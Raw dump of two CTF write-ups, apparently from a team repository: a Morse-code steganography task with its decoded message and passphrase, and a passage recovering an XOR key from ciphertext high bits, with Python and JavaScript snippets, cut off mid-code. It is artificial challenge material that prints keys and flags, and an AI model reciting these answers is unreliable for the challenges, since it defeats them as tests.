‹-.-.â€‹.-â€‹.-..â€‹.-..â€‹-.--â€‹..â€‹-â€‹.--â€‹.-â€‹...â€‹--â€‹.-â€‹-..â€‹.â€‹-â€‹---â€‹--â€‹.-â€‹-.-â€‹.â€‹---â€‹..-â€‹.-.â€‹.--â€‹---â€‹.-.â€‹-.-â€‹.â€‹.-â€‹...â€‹-.--â€‹.-â€‹-.â€‹-..â€‹..-.â€‹.-â€‹...â€‹-â€‹.-.-.-â€‹--â€‹---â€‹...â€‹-â€‹.--.â€‹.â€‹---â€‹.--.â€‹.-..â€‹.â€‹...â€‹.â€‹.â€‹---â€‹..-â€‹.-.â€‹..-.â€‹..-â€‹-â€‹..-â€‹.-.â€‹.â€‹-...â€‹.â€‹..â€‹-.â€‹--.â€‹-...â€‹.-â€‹...â€‹.â€‹-..â€‹---â€‹-.â€‹-â€‹.â€‹-.-.â€‹....â€‹-.â€‹---â€‹.-..â€‹---â€‹--.â€‹-.--â€‹.-â€‹-.â€‹-..â€‹..â€‹-â€‹..â€‹...â€‹.â€‹...-â€‹.â€‹-.â€‹..â€‹--â€‹.--.â€‹---â€‹.-.â€‹-â€‹.-â€‹-.â€‹-â€‹..â€‹-.â€‹-â€‹---â€‹-..â€‹.-â€‹-.--â€‹.----.â€‹...â€‹.-..â€‹..â€‹..-.â€‹.â€‹.-.-.-â€‹-...â€‹..-â€‹-â€‹---â€‹-.â€‹-â€‹....â€‹.â€‹---â€‹-â€‹....â€‹.â€‹.-.â€‹....â€‹.-â€‹-.â€‹-..â€‹--..--â€‹-â€‹....â€‹.â€‹.-.â€‹.â€‹.-â€‹.-.â€‹.â€‹...â€‹.â€‹...-â€‹.â€‹.-.â€‹.-â€‹.-..â€‹.-â€‹..-â€‹-â€‹....â€‹---â€‹.-.â€‹..â€‹-â€‹..â€‹.â€‹...â€‹-â€‹....â€‹.-â€‹-â€‹-.-.â€‹....â€‹.â€‹-.-.â€‹-.-â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹--â€‹---â€‹...-â€‹.â€‹-â€‹....â€‹.-â€‹-â€‹..â€‹...â€‹-..â€‹---â€‹-.â€‹.â€‹..â€‹-.â€‹-â€‹....â€‹.â€‹---â€‹-.â€‹.-..â€‹..â€‹-.â€‹.â€‹.â€‹-.â€‹...-â€‹..â€‹.-.â€‹---â€‹-.â€‹--â€‹.â€‹-.â€‹-â€‹.-.-.-â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹.â€‹--â€‹.-â€‹..â€‹.-..â€‹--..--â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹--â€‹.â€‹...â€‹...â€‹.-â€‹--.â€‹.â€‹..-.â€‹.-.â€‹---â€‹--â€‹..-.â€‹.-â€‹-.-.â€‹.â€‹-...â€‹---â€‹---â€‹-.-â€‹..â€‹...â€‹-.-.â€‹....â€‹.â€‹-.-.â€‹-.-â€‹.â€‹-..â€‹.-.-.-â€‹-â€‹....â€‹.â€‹-.--â€‹.-..â€‹---â€‹---â€‹-.-â€‹..-.â€‹---â€‹.-.â€‹-...â€‹.-â€‹-..â€‹--.â€‹..-â€‹-.--â€‹...â€‹--..--â€‹..â€‹-â€‹..â€‹...â€‹.-..â€‹.â€‹--.â€‹..â€‹-â€‹--..--â€‹-...â€‹..-â€‹-â€‹-.--â€‹---â€‹..-â€‹-.-.â€‹.-â€‹-.â€‹.----.â€‹-â€‹-..â€‹---â€‹-.--â€‹---â€‹..-â€‹.-.â€‹.--â€‹..â€‹..-.â€‹.â€‹...-â€‹..â€‹.-.â€‹-â€‹..-â€‹.-â€‹.-..â€‹.-..â€‹-.--â€‹.--â€‹..â€‹-â€‹....â€‹---â€‹..-â€‹-â€‹....â€‹.-â€‹...-â€‹..â€‹-.â€‹--.â€‹...â€‹---â€‹--â€‹.â€‹---â€‹-â€‹....â€‹.â€‹.-.â€‹.--.â€‹.-â€‹..â€‹.-.â€‹...â€‹---â€‹..-.â€‹.â€‹-.--â€‹.â€‹...â€‹.--â€‹.-â€‹-â€‹-.-.â€‹....â€‹..â€‹-.â€‹--.â€‹..â€‹-â€‹.-.-.-â€‹..â€‹-â€‹..â€‹...â€‹..-â€‹-.â€‹.-â€‹-.-.â€‹-.-.â€‹.â€‹.--.â€‹-â€‹.-â€‹-...â€‹.-..â€‹.â€‹-...â€‹..-â€‹-â€‹..â€‹-â€‹..â€‹...â€‹-â€‹....â€‹.â€‹.-.â€‹.â€‹.-â€‹.-..â€‹..â€‹-â€‹-.--â€‹.--â€‹.â€‹.-..â€‹..â€‹...-â€‹.â€‹..â€‹-.â€‹.-â€‹-.â€‹-..â€‹-â€‹....â€‹.â€‹.-â€‹-.-.â€‹-.-.â€‹.â€‹...â€‹...â€‹.--.â€‹.-â€‹...â€‹...â€‹.--.â€‹....â€‹.-.â€‹.-â€‹...â€‹.â€‹..â€‹...â€‹.....â€‹..---â€‹....-â€‹.----â€‹--...â€‹.----â€‹....-â€‹--...â€‹-----â€‹...--â€‹.....â€‹..-.â€‹-...â€‹.â€‹-.-.â€‹...--â€‹.....â€‹---..â€‹..---â€‹-.-.â€‹-....â€‹.â€‹.â€‹-----â€‹-.-.â€‹..---â€‹-....â€‹-----â€‹.----â€‹.....â€‹--...â€‹....-â€‹.-.-.-â€‹..â€‹....â€‹---â€‹.--.â€‹.â€‹-â€‹....â€‹.-â€‹-â€‹-â€‹....â€‹.â€‹---â€‹-.â€‹.â€‹...â€‹.--â€‹.-â€‹-â€‹-.-.â€‹....â€‹..â€‹-.â€‹--.â€‹..â€‹-â€‹..-.â€‹---â€‹.-.â€‹--.â€‹---â€‹-â€‹.-â€‹-...â€‹---â€‹..-â€‹-â€‹--â€‹---â€‹.-.â€‹...â€‹.â€‹-.-.â€‹---â€‹-..â€‹.â€‹.-â€‹-.â€‹-..â€‹-â€‹....â€‹.-â€‹-â€‹-â€‹....â€‹.â€‹---..â€‹---..â€‹.....â€‹-.-.â€‹....â€‹.-â€‹.-.â€‹.-â€‹-.-.â€‹-â€‹.â€‹.-.â€‹...â€‹..-â€‹...â€‹.â€‹-..â€‹-...â€‹.â€‹..-.â€‹---â€‹.-.â€‹.â€‹.--â€‹..â€‹.-..â€‹.-..â€‹--â€‹..â€‹...â€‹.-..â€‹.â€‹.-â€‹-..â€‹-â€‹....â€‹.â€‹--â€‹.-.-.-â€‹..â€‹.-â€‹--â€‹.--â€‹..â€‹...â€‹....â€‹..â€‹-.â€‹--.â€‹-.--â€‹---â€‹..-â€‹--.â€‹---â€‹---â€‹-..â€‹.-..â€‹..-â€‹-.-.â€‹-.-â€‹--â€‹-.--â€‹..-.â€‹.-.â€‹..â€‹.â€‹-.â€‹-..â€‹.-â€‹-.â€‹-..â€‹.-..â€‹.â€‹-â€‹.----.â€‹...â€‹....â€‹---â€‹.--.â€‹.â€‹-.â€‹---â€‹-.â€‹.â€‹---â€‹..-.â€‹..-â€‹...â€‹--.â€‹.â€‹-â€‹...â€‹-.-.â€‹.-â€‹..-â€‹--.â€‹....â€‹-â€‹.-.-.-â€‹.--.â€‹...â€‹---...â€‹..â€‹-...â€‹---â€‹..-â€‹--.â€‹....â€‹-â€‹-â€‹....â€‹.â€‹...â€‹.--.â€‹.-â€‹-.-.â€‹.â€‹...â€‹....â€‹..â€‹.--.â€‹.-.-.-\n```\n\nTeraz nie trudno sie domyślić ze `â€‹` to spacje, a zadanie staje się banalnie proste. Zostało rozwiązane przez wszystkie drużyny.\nPrzetłumaczona wiadomość\n\n```\nITISEXTREMELYINTERESTINGWHENYOUFINDOUTTHATASIMPLEENCODINGSCHEMECANPRODUCESOMUCHOFAHEADACHECOMPUTERNOWADAYSAREPARTOFOURDAILYLIVESCOMINGFROMTECHNOLOGYWHEREITISGETTINGBETTERFASTERANDMOREIMPLEMENTEDINTOOURDAILYLIVESEVERYDAYWECANTRESISTHOWIMPORTANTITISFOREVERYTHINGWEDOBASICALLYITWASMADETOMAKEOURWORKEASYANDFASTMOSTPEOPLESEEOURFUTUREBEINGBASEDONTECHNOLOGYANDITISEVENIMPORTANTINTODAYSLIFEBUTONTHEOTHERHANDTHEREARESEVERALAUTHORITIESTHATCHECKEVERYMOVETHATISDONEINTHEONLINEENVIRONMENTEVERYEMAILEVERYMESSAGEFROMFACEBOOKISCHECKEDTHEYLOOKFORBADGUYSITISLEGITBUTYOUCANTDOYOURWIFEVIRTUALLYWITHOUTHAVINGSOMEOTHERPAIRSOFEYESWATCHINGITITISUNACCEPTABLEBUTITISTHEREALITYWELIVEINANDTHEACCESSPASSPHRASEIS52417147035FBEC3582C6EE0C2601574IHOPETHATTHEONESWATCHINGITFORGOTABOUTMORSECODEANDTHATTHE885CHARACTERSUSEDBEFOREWILLMISLEADTHEMIAMWISHINGYOUGOODLUCKMYFRIENDANDLETSHOPENONEOFUSGETSCAUGHTPSIBOUGHTTHESPACESHIP\n```\n\n### ENG version\n\nThe task was as follows \"We have captured hackers conversation in which he mentions secret password. Is for almost 100% encoded with morse alphabet. Dumb protocol erases all spaces. Get the password\"\nFlag is in format dctf{md5}.\n\n```\n..-......-..--.-..--..-..-.--..-.-..-.....-..-.--..--.....-.-.-----..-..-...-.-..---..---.....--.-.....--.--..-....-.-.-.----....-.--....-.-......--.-.-..--..--..-.----....--.-.....-----..--.-.....---..-..-......--...--.-.......-.-.--.-.-----.--...--..-.-.---.--.--...--.--....-.-...--..-.-.----..-.---..-.-.-...-...-..-.--.-.......-.....-.-.--.-.-----..-.--...-..-.------.-.-.....-.---.-..-----.-.--.--......-....-.....--..--..-.--.-....--..-.--..--..-..-...-..-.--..--.--.-..-----.-....--.--..-...--.-.-.-....-.-------..-.-.-...-...-..-.--.-.......-........-..-.-.---...--.--.-.-.-.--.-.-..--..----.-.-..........-....---.--..--.--.---.-.-.--.-..-.......-.---.-.....-..-.-.---......-.--..--.-..---.-.-.--....-.....-.-..-.-...-..-.--..-.--.-...--.--...------.--.-.---..-.-..-----.-.-.-..-...-.--.--.-....-..-...-.-.-.------...-.--..---.--..-........---..-.-...-...--..-.-..-......-.--.-....-....-..----.-.-.-.....-.---.-..-----.-.--.--.-....-.........-.-...--.--.---.-.-.--.-..-.-----...--.--.----.....-......-...-.-.--.....------.-.....----......-......--.-..--..---......-...-.-.........-..-..-.-...-..--....---.-...-......-.....---.-......-.-.-.-....-..-.-.-------...-.-.....--.....-..----....-.-.....----..-....-...-....-...-.----.--.-.-.-.-.-....-..-.-.--.--.-...-..--..--....-..-.-.----........---....-..-.-----..-..--.-..-...-------.-.....-.-......-.-.-.-.-...-.-.--.....-.--.-..-------.-..-.---.-.-....--..--...--.--...--..--..-......-...--...---..---.....---.-----..--.-..--..----.--..----.-----..-.-..--....-.....-...-.-..-.-.-...-..-.--.--..-....---..--.....-...-..-.--....-----.----......-..--..-...-....---..-..-.--.....--.---.-.......-.--...-.-.-.-..-.......--..--.-.-.-...--.-.--....-...-.....--..-.....-......-...-.-....--.--.--..-.......-...-..--.-..-......--.-.-.-.........--..-.......--......-..-................---....-.------....----....---...-----...--.......-.-....-.-....--.....---....----.-.-......------.-...----....-----.----.....--.......-.-.-.-......---.--..-.....---.....----......--.---.-.......-.--...-..-.---.-.--.----.--...---..-------.-.....-.-.----....--.-..-.....---.....---..---.......-.-......-.-..--.-.-..-......-....-..-......-.---.-...--...-...-..--......-....--..-.....--.-.-.-...---.--...........-.--.-.-----..---.-------...-....--.-.-.----.--..-..-....-.-...--.-...-...-.----........---.--..-.----..---..-...-...--..-...-.-..-..---.....-.-.-.-.--....---.....-...---..---.....--.........--..--.-............--..-.-.-\n```\n\nWe have downloaded code from [https://gist.github.com/ebuckley/1842461](https://gist.github.com/ebuckley/1842461) and modified it by adding numbers to dictionary and limiting other characters to A-F range.\nWe get almos 20 milions of md5 hashes. We have also triead some dictionary based solvers but with no avail.\nAfter eleven hours of twenty four the organisers realised it's unsolvable.\nThey updated code to:\n\n```\n..â€‹-â€‹..â€‹...â€‹.â€‹-..-â€‹-â€‹.-.â€‹.â€‹--â€‹.â€‹.-..â€‹-.--â€‹..â€‹-.â€‹-â€‹.â€‹.-.â€‹.â€‹...â€‹-â€‹..â€‹-.â€‹--.â€‹.--â€‹....â€‹.â€‹-.â€‹-.--â€‹---â€‹..-â€‹..-.â€‹..â€‹-.â€‹-..â€‹---â€‹..-â€‹-â€‹-â€‹....â€‹.-â€‹-â€‹.-â€‹...â€‹..â€‹--â€‹.--.â€‹.-..â€‹.â€‹.â€‹-.â€‹-.-.â€‹---â€‹-..â€‹..â€‹-.â€‹--.â€‹...â€‹-.-.â€‹....â€‹.â€‹--â€‹.â€‹-.-.â€‹.-â€‹-.â€‹.--.â€‹.-.â€‹---â€‹-..â€‹..-â€‹-.-.â€‹.â€‹...â€‹---â€‹--â€‹..-â€‹-.-.â€‹....â€‹---â€‹..-.â€‹.-â€‹....â€‹.â€‹.-â€‹-..â€‹.-â€‹-.-.â€‹....â€‹.â€‹.-.-.-â€‹-.-.â€‹---â€‹--â€‹.--.â€‹..-â€‹-â€‹.â€‹.-.â€‹-.â€‹---â€‹.--â€‹.-â€‹-..â€‹.-â€‹-.--â€‹...â€‹.-â€‹.-.â€‹.â€‹.--.â€‹.-â€‹.-.â€‹-â€‹---â€‹..-.â€‹---â€‹..-â€‹.-.â€‹-..â€‹.-â€‹..â€‹.-..â€‹-.--â€‹.-..â€‹..â€‹...-â€‹.â€‹...â€‹.-.-.-â€‹-.-.â€‹---â€‹--â€‹..â€‹-.â€‹--.â€‹..-.â€‹.-.â€‹---â€‹--â€‹-â€‹.â€‹-.-.â€‹....â€‹-.â€‹---â€‹.-..â€‹---â€‹--.â€‹-.--â€‹.--â€‹....â€‹.â€‹.-.â€‹.â€‹..â€‹-â€‹..â€‹...â€‹--.â€‹.â€‹-â€‹-â€‹..â€‹-.â€‹--.â€‹-...â€‹.â€‹-â€‹-â€‹.â€‹.-.â€‹--..--â€‹..-.â€‹.-â€‹...â€‹-â€‹.â€‹.-.â€‹--..--â€‹.-â€‹-.â€‹-..â€‹--â€‹---â€‹.-.â€‹.â€‹..â€‹--â€‹.--.â€‹.-..â€‹.â€‹--â€‹.â€‹-.â€‹-â€‹.â€‹-..â€‹..â€‹-.â€‹-â€‹---â€‹---â€‹..-â€‹.-.â€‹-..â€‹.-â€‹..â€‹.-..â€‹-.--â€‹.-..â€‹..â€‹...-â€‹.â€‹...â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹-..â€‹.-â€‹-.--â€‹.-.-.-â€‹.--â€‹.â€‹-.-.â€‹.-â€‹-.â€‹.----.â€‹-â€‹.-.â€‹.â€‹...â€‹..â€‹...â€‹-â€‹....â€‹---â€‹.--â€‹..â€‹--â€‹.--.â€‹---â€‹.-.â€‹-â€‹.-â€‹-.â€‹-â€‹..â€‹-â€‹..â€‹...â€‹..-.â€‹---â€‹.-.â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹-â€‹....â€‹..â€‹-.â€‹--.â€‹.--â€‹.â€‹-..â€‹---â€‹.-.-.-â€‹-...â€‹.-â€‹...â€‹..â€‹-.-.â€‹.-â€‹.-..â€‹.-..â€‹-.--â€‹..â€‹-â€‹.--â€‹.-â€‹...â€‹--â€‹.-â€‹-..â€‹.â€‹-â€‹---â€‹--â€‹.-â€‹-.-â€‹.â€‹---â€‹..-â€‹.-.â€‹.--â€‹---â€‹.-.â€‹-.-â€‹.â€‹.-â€‹...â€‹-.--â€‹.-â€‹-.â€‹-..â€‹..-.â€‹.-â€‹...â€‹-â€‹.-.-.-â€‹--â€‹---â€‹...â€‹-â€‹.--.â€‹.â€‹---â€‹.--.â€‹.-..â€‹.â€‹...â€‹.â€‹.â€‹---â€‹..-â€‹.-.â€‹..-.â€‹..-â€‹-â€‹..-â€‹.-.â€‹.â€‹-...â€‹.â€‹..â€‹-.â€‹--.â€‹-...â€‹.-â€‹...â€‹.â€‹-..â€‹---â€‹-.â€‹-â€‹.â€‹-.-.â€‹....â€‹-.â€‹---â€‹.-..â€‹---â€‹--.â€‹-.--â€‹.-â€‹-.â€‹-..â€‹..â€‹-â€‹..â€‹...â€‹.â€‹...-â€‹.â€‹-.â€‹..â€‹--â€‹.--.â€‹---â€‹.-.â€‹-â€‹.-â€‹-.â€‹-â€‹..â€‹-.â€‹-â€‹---â€‹-..â€‹.-â€‹-.--â€‹.----.â€‹...â€‹.-..â€‹..â€‹..-.â€‹.â€‹.-.-.-â€‹-...â€‹..-â€‹-â€‹---â€‹-.â€‹-â€‹....â€‹.â€‹---â€‹-â€‹....â€‹.â€‹.-.â€‹....â€‹.-â€‹-.â€‹-..â€‹--..--â€‹-â€‹....â€‹.â€‹.-.â€‹.â€‹.-â€‹.-.â€‹.â€‹...â€‹.â€‹...-â€‹.â€‹.-.â€‹.-â€‹.-..â€‹.-â€‹..-â€‹-â€‹....â€‹---â€‹.-.â€‹..â€‹-â€‹..â€‹.â€‹...â€‹-â€‹....â€‹.-â€‹-â€‹-.-.â€‹....â€‹.â€‹-.-.â€‹-.-â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹--â€‹---â€‹...-â€‹.â€‹-â€‹....â€‹.-â€‹-â€‹..â€‹...â€‹-..â€‹---â€‹-.â€‹.â€‹..â€‹-.â€‹-â€‹....â€‹.â€‹---â€‹-.â€‹.-..â€‹..â€‹-.â€‹.â€‹.â€‹-.â€‹...-â€‹..â€‹.-.â€‹---â€‹-.â€‹--â€‹.â€‹-.â€‹-â€‹.-.-.-â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹.â€‹--â€‹.-â€‹..â€‹.-..â€‹--..--â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹--â€‹.â€‹...â€‹...â€‹.-â€‹--.â€‹.â€‹..-.â€‹.-.â€‹---â€‹--â€‹..-.â€‹.-â€‹-.-.â€‹.â€‹-...â€‹---â€‹---â€‹-.-â€‹..â€‹...â€‹-.-.â€‹....â€‹.â€‹-.-.â€‹-.-â€‹.â€‹-..â€‹.-.-.-â€‹-â€‹....â€‹.â€‹-.--â€‹.-..â€‹---â€‹---â€‹-.-â€‹..-.â€‹---â€‹.-.â€‹-...â€‹.-â€‹-..â€‹--.â€‹..-â€‹-.--â€‹...â€‹--..--â€‹..â€‹-â€‹..â€‹...â€‹.-..â€‹.â€‹--.â€‹..â€‹-â€‹--..--â€‹-...â€‹..-â€‹-â€‹-.--â€‹---â€‹..-â€‹-.-.â€‹.-â€‹-.â€‹.----.â€‹-â€‹-..â€‹---â€‹-.--â€‹---â€‹..-â€‹.-.â€‹.--â€‹..â€‹..-.â€‹.â€‹...-â€‹..â€‹.-.â€‹-â€‹..-â€‹.-â€‹.-..â€‹.-..â€‹-.--â€‹.--â€‹..â€‹-â€‹....â€‹---â€‹..-â€‹-â€‹....â€‹.-â€‹...-â€‹..â€‹-.â€‹--.â€‹...â€‹---â€‹--â€‹.â€‹---â€‹-â€‹....â€‹.â€‹.-.â€‹.--.â€‹.-â€‹..â€‹.-.â€‹...â€‹---â€‹..-.â€‹.â€‹-.--â€‹.â€‹...â€‹.--â€‹.-â€‹-â€‹-.-.â€‹....â€‹..â€‹-.â€‹--.â€‹..â€‹-â€‹.-.-.-â€‹..â€‹-â€‹..â€‹...â€‹..-â€‹-.â€‹.-â€‹-.-.â€‹-.-.â€‹.â€‹.--.â€‹-â€‹.-â€‹-...â€‹.-..â€‹.â€‹-...â€‹..-â€‹-â€‹..â€‹-â€‹..â€‹...â€‹-â€‹....â€‹.â€‹.-.â€‹.â€‹.-â€‹.-..â€‹..â€‹-â€‹-.--â€‹.--â€‹.â€‹.-..â€‹..â€‹...-â€‹.â€‹..â€‹-.â€‹.-â€‹-.â€‹-..â€‹-â€‹....â€‹.â€‹.-â€‹-.-.â€‹-.-.â€‹.â€‹...â€‹...â€‹.--.â€‹.-â€‹...â€‹...â€‹.--.â€‹....â€‹.-.â€‹.-â€‹...â€‹.â€‹..â€‹...â€‹.....â€‹..---â€‹....-â€‹.----â€‹--...â€‹.----â€‹....-â€‹--...â€‹-----â€‹...--â€‹.....â€‹..-.â€‹-...â€‹.â€‹-.-.â€‹...--â€‹.....â€‹---..â€‹..---â€‹-.-.â€‹-....â€‹.â€‹.â€‹-----â€‹-.-.â€‹..---â€‹-....â€‹-----â€‹.----â€‹.....â€‹--...â€‹....-â€‹.-.-.-â€‹..â€‹....â€‹---â€‹.--.â€‹.â€‹-â€‹....â€‹.-â€‹-â€‹-â€‹....â€‹.â€‹---â€‹-.â€‹.â€‹...â€‹.--â€‹.-â€‹-â€‹-.-.â€‹....â€‹..â€‹-.â€‹--.â€‹..â€‹-â€‹..-.â€‹---â€‹.-.â€‹--.â€‹---â€‹-â€‹.-â€‹-...â€‹---â€‹..-â€‹-â€‹--â€‹---â€‹.-.â€‹...â€‹.â€‹-.-.â€‹---â€‹-..â€‹.â€‹.-â€‹-.â€‹-..â€‹-â€‹....â€‹.-â€‹-â€‹-â€‹....â€‹.â€‹---..â€‹---..â€‹.....â€‹-.-.â€‹....â€‹.-â€‹.-.â€‹.-â€‹-.-.â€‹-â€‹.â€‹.-.â€‹...â€‹..-â€‹...â€‹.â€‹-..â€‹-...â€‹.â€‹..-.â€‹---â€‹.-.â€‹.â€‹.--â€‹..â€‹.-..â€‹.-..â€‹--â€‹..â€‹...â€‹.-..â€‹.â€‹.-â€‹-..â€‹-â€‹....â€‹.â€‹--â€‹.-.-.-â€‹..â€‹.-â€‹--â€‹.--â€‹..â€‹...â€‹....â€‹..â€‹-.â€‹--.â€‹-.--â€‹---â€‹..-â€‹--.â€‹---â€‹---â€‹-..â€‹.-..â€‹..-â€‹-.-.â€‹-.-â€‹--â€‹-.--â€‹..-.â€‹.-.â€‹..â€‹.â€‹-.â€‹-..â€‹.-â€‹-.â€‹-..â€‹.-..â€‹.â€‹-â€‹.----.â€‹...â€‹....â€‹---â€‹.--.â€‹.â€‹-.â€‹---â€‹-.â€‹.â€‹---â€‹..-.â€‹..-â€‹...â€‹--.â€‹.â€‹-â€‹...â€‹-.-.â€‹.-â€‹..-â€‹--.â€‹....â€‹-â€‹.-.-.-â€‹.--.â€‹...â€‹---...â€‹..â€‹-...â€‹---â€‹..-â€‹--.â€‹....â€‹-â€‹-â€‹....â€‹.â€‹...â€‹.--.â€‹.-â€‹-.-.â€‹.â€‹...â€‹....â€‹..â€‹.--.â€‹.-.-.-\n```\n\nNow it's easy to guess that `â€‹` replaced spaces and task is trivial. Task was solved by every team.\nDecoded message\n\n```\nITISEXTREMELYINTERESTINGWHENYOUFINDOUTTHATASIMPLEENCODINGSCHEMECANPRODUCESOMUCHOFAHEADACHECOMPUTERNOWADAYSAREPARTOFOURDAILYLIVESCOMINGFROMTECHNOLOGYWHEREITISGETTINGBETTERFASTERANDMOREIMPLEMENTEDINTOOURDAILYLIVESEVERYDAYWECANTRESISTHOWIMPORTANTITISFOREVERYTHINGWEDOBASICALLYITWASMADETOMAKEOURWORKEASYANDFASTMOSTPEOPLESEEOURFUTUREBEINGBASEDONTECHNOLOGYANDITISEVENIMPORTANTINTODAYSLIFEBUTONTHEOTHERHANDTHEREARESEVERALAUTHORITIESTHATCHECKEVERYMOVETHATISDONEINTHEONLINEENVIRONMENTEVERYEMAILEVERYMESSAGEFROMFACEBOOKISCHECKEDTHEYLOOKFORBADGUYSITISLEGITBUTYOUCANTDOYOURWIFEVIRTUALLYWITHOUTHAVINGSOMEOTHERPAIRSOFEYESWATCHINGITITISUNACCEPTABLEBUTITISTHEREALITYWELIVEINANDTHEACCESSPASSPHRASEIS52417147035FBEC3582C6EE0C2601574IHOPETHATTHEONESWATCHINGITFORGOTABOUTMORSECODEANDTHATTHE885CHARACTERSUSEDBEFOREWILLMISLEADTHEMIAMWISHINGYOUGOODLUCKMYFRIENDANDLETSHOPENONEOFUSGETSCAUGHTPSIBOUGHTTHESPACESHIP\n```\n", "timestamp": "2025-10-21T22:03:19.327864"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/crypto300/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/crypto300/README.md", "content": "﻿## Crypto 300 (crypto, 300p)\n\n### PL\n\n[ENG](#eng-version)\n\nZadanie polegało na odwróceniu działania podanego algorytmu, zaimplementowanego w javascripcie, dla podanego zaszyfrowanego tekstu. Kod szyfrujący i deszyfrujący umieszczony w zadaniu znajduje się [tutaj](./crypto300.js)\n\nZaszyfrowanego tekst: `51136f3b763d7d5e5910106d423f0908093931284bc6eda1a4ffa595c390b390ef89a4a08ffb9797a2b797f5af92b7a0aaac9cf2dbf9ccecd5c8b3cbb9fffefa4fcf0c26d761f9145793fb6a44ed048cb92a1c0f420e3af756d66f2d1ee94414ed335f180b34fca1fda4f9698a23287ca9e9acb2e8b7c0216c132c078c93a438217e0927ce1afbcf016fd7cc6b1f8b903ec3c0a19f723ae5c0fa46679ded50d17259f89688a5ff4340784a155d`\n\nAnaliza kodu pozwoliła nam stwierdzić, że każdy z bajtów w zakodowanym tekście jest wynikiem operacji XOR na 3 wartościach: bajcie danych wejściowych, bajcie ze specjalnie przygotowanej tablicy z elementami 0-128 oraz bajcie z klucza. \nJeśli klucz szyfrowania był za krótki, dokonywane było jego przedłużenie poprzez dokonanie przesunięcia bitowego w lewo o 1 pozycję, a następnie wykonanie kilku dodatkowych operacji bitowych a na koniec tak przygotowany element dodawany był na koniec klucza.\nPrzesuwanie bitów pewnego elementu klucza w celu uzyskania nowego elementu klucza oznaczało, że dla odpowiednio dlugiego tekstu pewne bajty będą xorowane z kluczem, kolejne bajty z poprzesuwanym kluczem itd.\nZ tych 3 elementów xorowanych aby uzyskać ciphertext jedynie klucz mógł zawierać zapalony najwyższy bit, ponieważ klucz w trakcie \"wydłużania\" przesuwał bity w lewo.\nOznacza to, że mogliśmy sprawdzić czy wysoki bit ciphertextu jest zapalony lub nie i na tej podstawie stwierdzić czy najwyższy bit klucza był zapalony czy tez nie.\n\nWarto zauważyć, że jeśli szyfrując zaczniemy korzystać z przedłużonej części klucza, to najwyższy bit pierwszego przedłużenia to jest 2 bit najbardziej znaczący z oryginalnego klucza, najwyższy bit drugiego przedłużenia to 3 najbardziej znaczący bit oryginalnego klucza etc.\n\nW efekcie jeśli nasz klucz jest przynajmniej 8 razy krótszy niż plaintext możemy w ten sposób odzyskac wszystkie bity klucza.\n\nOstatnim krokiem było poznanie długości klucza. Wykorzystaliśmy do tego założenie, że klucz jako tekst ascii nie posiada zapalonych wysokich bitów, więc pierwsza pozycja w ciphertexcie, która ma zapalony najwyższy bit określa miejsce gdzie musiał zostać użyty klucz przedłużony. Taka pozycja określa maksymalną długość klucza oryginalnego. Następnie wykonaliśmy operacje ekstrakcji kluczy dla wszystkich wartości pomiędzy 2 a tym indeksem. Używając kodu:\n\n```python\ndef test(KEY_LEN):\n    out = []\n\n    for i in range(len(inp)):\n        new = 1 if (ord(inp[i]) & 0x80) != 0 else 0\n        out.append(new)\n\n    res = ''\n    for i in range(KEY_LEN):\n        bits = out[i::KEY_LEN]\n        bitstr = ''.join(str(x) for x in bits)\n        res += chr(int(bitstr[:8], 2))\n    return res\n```\n\nUzyskaliśmy dla długości klucza 21 wartość `weplayctfoutofpassion`. Tą wartość wykorzystaliśmy w oryginalnym skrypcie javascript do zdekodowania wejściowego ciągu:\n\n```javascript\nkey = \"weplayctfoutofpassion\";\ninput = '51136f3b763d7d5e5910106d423f0908093931284bc6eda1a4ffa595c390b390ef89a4a08ffb9797a2b797f5af92b7a0aaac9cf2dbf9ccecd5c8b3cbb9fffefa4fcf0c26d761f9145793fb6a44ed048cb92a1c0f420e3af756d66f2d1ee94414ed335f180b34fca1fda4f9698a23287ca9e9acb2e8b7c0216c132c078c93a438217e0927ce1afbcf016fd7cc6b1f8b903ec3c0a19f723ae5c0fa46679ded50d17259f89688a5ff4340784a155d'\nconsole.log(proceed(input, key, 'decrypt'));\n```\n\nCo dało nam:\n\n`Awesome work, you should now have just one left to go unless you selected randomly. I m giving you the flag: 1112fc63b939ab8b22a2b6995ba0be95. Enjoy the rest of the journey!`\n\n### ENG version\n\nThe task was to revert given algorithm, implemented in javascript, for given ciphertext. The cipher code was given and is available [here](./crypto300.js).\n\nCiphertext: `51136f3b763d7d5e5910106d423f0908093931284bc6eda1a4ffa595c390b390ef89a4a08ffb9797a2b797f5af92b7a0aaac9cf2dbf9ccecd5c8b3cbb9fffefa4fcf0c26d761f9145793fb6a44ed048cb92a1c0f420e3af756d66f2d1ee94414ed335f180b34fca1fda4f9698a23287ca9e9acb2e8b7c0216c132c078c93a438217e0927ce1afbcf016fd7cc6b1f8b903ec3c0a19f723ae5c0fa46679ded50d17259f89688a5ff4340784a155d`\n\nThe analysis of the code showed us that every byte in the encoded text is a result of XOR operations on 3 values: byte from input, byte from special table with values 0-128 and byte from key.\nIf the the key was too short, it was extended by doing a left bitshift, the some more bit operations and in the end it was appended to the original key.\nShifting bits of element of the key in order to get a new element of the key means that for sufficiently large text some bytes will be xored with original key, next bytes with shifted key etc.\nOut of those 3 elements xored to get the ciphertext/plaintext only the key could have a lighted higest bit, since when the key was \"extended\" it was shifting bits to the left. This means that we could check if the higest bit of ciphertext is lighted or not and based on that decide if the highest bit of the key was lighted or not.\n\nIt's worth noting that that when we encode the input and start using the extended key part, then highest bit of the first extension is actually the 2nd most significant bit of the original key, highest bit of the 2nd extension is the 3rd most significant bit of the original key etc.\n\nAs a result if our key is at least 8 times shorter than he plaintext we can extract all the bits of the key.\n\nThe last step was to figure out how long is the key. We used the assumption that te key is ascii text so does not have high bits set to 1, and therefore the first lighted highest bit marks the index at which we must have started using key extension. This means that the key can be at most that long. Then we extracted all potential keys of length from 2 to the index we found, with the code:\n\n```python\ndef 